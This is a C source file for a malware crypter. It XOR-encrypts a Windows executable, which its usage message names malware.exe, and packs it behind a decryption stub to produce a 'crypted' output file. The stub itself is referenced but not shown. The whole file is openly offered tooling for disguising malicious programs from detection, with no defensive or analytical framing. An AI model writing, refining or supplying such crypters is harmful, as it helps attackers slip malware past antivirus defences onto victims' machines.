#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STUB_SIZE 0x800      // Must match the hardcoded size in stub.asm
#define XOR_KEY 0xAA

void encrypt_file(const char *input_path, const char *stub_path, const char *output_path) {
    FILE *fp_in, *fp_stub, *fp_out;
    long file_size, stub_size;
    unsigned char *buffer, *stub_buffer;

    // 1. Read Stub
    fp_stub = fopen(stub_path, "rb");
    if (!fp_stub) { perror("Stub not found"); exit(1); }
    fseek(fp_stub, 0, SEEK_END);
    stub_size = ftell(fp_stub);
    fseek(fp_stub, 0, SEEK_SET);
    stub_buffer = malloc(stub_size);
    fread(stub_buffer, 1, stub_size, fp_stub);
    fclose(fp_stub);

    // 2. Read Target PE
    fp_in = fopen(input_path, "rb");
    if (!fp_in) { perror("Input file not found"); exit(1); }
    fseek(fp_in, 0, SEEK_END);
    file_size = ftell(fp_in);
    fseek(fp_in, 0, SEEK_SET);
    buffer = malloc(file_size);
    fread(buffer, 1, file_size, fp_in);
    fclose(fp_in);

    // 3. Encrypt (XOR)
    for (long i = 0; i < file_size; i++) {
        buffer[i] ^= XOR_KEY;
    }

    // 4. Write Output
    fp_out = fopen(output_path, "wb");
    if (!fp_out) { perror("Cannot create output"); exit(1); }

    // Write Stub
    fwrite(stub_buffer, 1, stub_size, fp_out);
    
    // Write Size Header (8 bytes) - Helps the stub know how much to decrypt
    fwrite(&file_size, 1, 8, fp_out);
    
    // Write Encrypted PE
    fwrite(buffer, 1, file_size, fp_out);

    fclose(fp_out);
    printf("[+] Success: %s -> %s\n", input_path, output_path);
    printf("[+] Size: %ld bytes (stub: %ld, encrypted: %ld)\n", stub_size + 8 + file_size, stub_size, file_size);

    free(buffer);
    free(stub_buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <malware.exe> <stub.bin> <crypted.exe>\n", argv[0]);
        return 1;
    }
    encrypt_file(argv[1], argv[2], argv[3]);
    return 0;
}
